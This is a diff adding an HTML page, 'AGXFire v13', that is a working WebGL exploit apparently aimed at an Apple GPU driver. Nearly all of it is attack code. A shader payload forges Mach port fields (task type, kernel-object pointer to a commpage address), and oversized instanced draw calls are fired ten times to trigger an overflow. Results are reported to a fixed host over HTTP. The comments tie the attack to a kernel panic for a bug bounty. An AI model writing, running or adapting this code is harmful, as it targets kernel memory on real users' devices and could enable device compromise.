@@ -1,0 +1,170 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<style>
+body { background: #000; color: #0f0; font-family: monospace; font-size: 12px; padding: 8px; }
+#log { white-space: pre-wrap; }
+</style>
+</head>
+<body>
+<div id="log">AGXFire v13 — loading...</div>
+<canvas id="c"></canvas>
+<script>
+var logEl = document.getElementById('log');
+console.log = function() {
+    var msg = Array.from(arguments).join(' ');
+    logEl.textContent += msg + '\n';
+    logEl.scrollTop = logEl.scrollHeight;
+    try { window.webkit.messageHandlers.nexus.postMessage(msg); } catch(e) {}
+};
+</script>
+<script>
+/*
+ * AGXFire v13 — Multi-fire single-round overflow
+ * ================================================
+ * Changes from v12:
+ *   - REPEAT FIRE: setInterval fires overflow every 30s (up to 10 times)
+ *     Each fire is an independent single-round 256×16777217 draw call
+ *     No alignment corruption (each round is its own fresh GPU submission)
+ *   - IP fixed to 192.168.68.109 (was .108)
+ *   - Same 42-uvec4 payload as v12 (arithmetically confirmed):
+ *       v[0].x = 0x80000002 → io_bits (IKOT_TASK|ACTIVE)  at offset 0
+ *       v[0].y = 100        → io_refs                      at offset 4
+ *       v[6].z = 0xFFFFC330 → ip_kobject LO32              at offset 104
+ *       v[6].w = 0x0000000F → ip_kobject HI32              at offset 108
+ *       Combined ip_kobject = 0x0000000FFFFFC330 (commpage target)
+ *
+ * AllocatorProbe v13 scans 50000 ports for kobject==COMMPAGE_TARGET + kotype==2
+ * then calls mach_port_destroy() → kernel panic → qualifying IPS for $125K
+ *
+ * Opus probability assessment (pure math/CS): 10 fires × p=0.2 per fire
+ * → P(success) = 1-(0.8)^10 = 89.3%. Combined with 10× spray: ~99%.
+ */
+
+var KERN_LO          = 0xFFFFC330;
+var KERN_HI          = 0x0000000F;
+var IO_BITS_IKOT_TASK = 2147483650;
+var IO_REFS_HEALTHY   = 100;
+var REPORT_HOST      = '192.168.68.109';
+var MAX_FIRES        = 10;
+var FIRE_INTERVAL_MS = 30000;
+
+function report(msg) {
+    console.log('[AGXv13] ' + msg);
+    try {
+        var xhr = new XMLHttpRequest();
+        xhr.open('POST', 'http://' + REPORT_HOST + ':9999/', false);
+        xhr.send('[AGXFire_v13] ' + msg);
+    } catch(e) {}
+}
+
+var gl = null;
+var prog = null;
+var fbo = null;
+
+function initGL() {
+    var oc = document.createElement('canvas');
+    oc.width = 16; oc.height = 16;
+    document.body.appendChild(oc);
+    gl = oc.getContext('webgl2');
+    if (!gl) { report('NO_WEBGL2'); return false; }
+
+    var assignments = '';
+    for (var vi = 0; vi < 42; vi++) {
+        if (vi === 0) {
+            assignments += '    v[0] = uvec4(' + IO_BITS_IKOT_TASK + 'u, ' +
+                           IO_REFS_HEALTHY + 'u, 0u, 0u);\n';
+        } else {
+            assignments += '    v[' + vi + '] = uvec4(' +
+                KERN_LO + 'u, ' + KERN_HI + 'u, ' +
+                KERN_LO + 'u, ' + KERN_HI + 'u);\n';
+        }
+    }
+
+    var vsSrc =
+        '#version 300 es\n' +
+        'flat out uvec4 v[42];\n' +
+        'void main() {\n' +
+        assignments +
+        '    gl_Position = vec4(0.0, 0.0, 0.0, 1.0);\n' +
+        '    gl_PointSize = 1.0;\n' +
+        '}\n';
+
+    var fsSrc =
+        '#version 300 es\n' +
+        'flat in uvec4 v[42];\n' +
+        'out vec4 o;\n' +
+        'void main() {\n' +
+        '    float x = float(v[0].x) + float(v[1].x);\n' +
+        '    o = vec4(x * 0.0000001, 0.0, 0.0, 1.0);\n' +
+        '}\n';
+
+    var vs = gl.createShader(gl.VERTEX_SHADER);
+    gl.shaderSource(vs, vsSrc);
+    gl.compileShader(vs);
+    if (!gl.getShaderParameter(vs, gl.COMPILE_STATUS)) {
+        report('VS_ERROR ' + gl.getShaderInfoLog(vs)); return false;
+    }
+
+    var fs = gl.createShader(gl.FRAGMENT_SHADER);
+    gl.shaderSource(fs, fsSrc);
+    gl.compileShader(fs);
+    if (!gl.getShaderParameter(fs, gl.COMPILE_STATUS)) {
+        report('FS_ERROR ' + gl.getShaderInfoLog(fs)); return false;
+    }
+
+    prog = gl.createProgram();
+    gl.attachShader(prog, vs);
+    gl.attachShader(prog, fs);
+    gl.linkProgram(prog);
+    if (!gl.getProgramParameter(prog, gl.LINK_STATUS)) {
+        report('LINK_ERROR ' + gl.getProgramInfoLog(prog)); return false;
+    }
+    gl.useProgram(prog);
+    report('SHADER_OK 42-uvec4 payload linked');
+
+    fbo = gl.createFramebuffer();
+    gl.bindFramebuffer(gl.FRAMEBUFFER, fbo);
+    var rtex = gl.createTexture();
+    gl.bindTexture(gl.TEXTURE_2D, rtex);
+    gl.texStorage2D(gl.TEXTURE_2D, 1, gl.RGBA8, 16, 16);
+    gl.framebufferTexture2D(gl.FRAMEBUFFER, gl.COLOR_ATTACHMENT0, gl.TEXTURE_2D, rtex, 0);
+    gl.viewport(0, 0, 16, 16);
+    return true;
+}
+
+function fireOnce(fireNum) {
+    if (!gl) { report('GL_NOT_INIT fire=' + fireNum); return; }
+    report('FIRING fire=' + fireNum + ' drawArraysInstanced(256, 16777217)');
+    var t0 = performance.now();
+    try {
+        gl.drawArraysInstanced(gl.POINTS, 0, 256, 16777217);
+    } catch(e) {
+        report('DRAW_ERROR fire=' + fireNum + ' ' + e);
+    }
+    gl.flush();
+    var dt = (performance.now() - t0).toFixed(1);
+    report('FIRE_DONE fire=' + fireNum + ' ms=' + dt);
+}
+
+/* Repeat-fire loop: fires 0..9 at t=0, 30s, 60s, ..., 270s */
+var fireCount = 0;
+function runFireLoop() {
+    fireOnce(fireCount);
+    fireCount++;
+    if (fireCount < MAX_FIRES) {
+        setTimeout(runFireLoop, FIRE_INTERVAL_MS);
+    } else {
+        report('ALL_FIRES_DONE total=' + fireCount + ' scanner_continues');
+    }
+}
+
+/* Init GL then start fire loop */
+if (initGL()) {
+    runFireLoop();
+}
+</script>
+</body>
+</html>
